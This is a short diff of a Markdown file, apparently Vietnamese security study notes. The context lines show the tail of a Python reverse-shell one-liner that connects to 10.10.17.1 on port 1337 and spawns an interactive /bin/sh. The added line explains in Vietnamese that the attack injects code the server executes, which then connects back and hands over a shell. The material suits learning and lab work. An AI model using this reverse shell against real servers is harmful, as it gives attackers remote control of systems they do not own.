@@ -202,6 +202,7 @@ s.connect(("10.10.17.1",1337));
 os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);'
 ```
+**Tiêm mã độc vào server và lừa server vào thực hiện mã độc đó, từ đó server sẽ kết nối về máy chủ và cấp phiên shell trên máy chủ**
 ___
 Tài liệu:
 
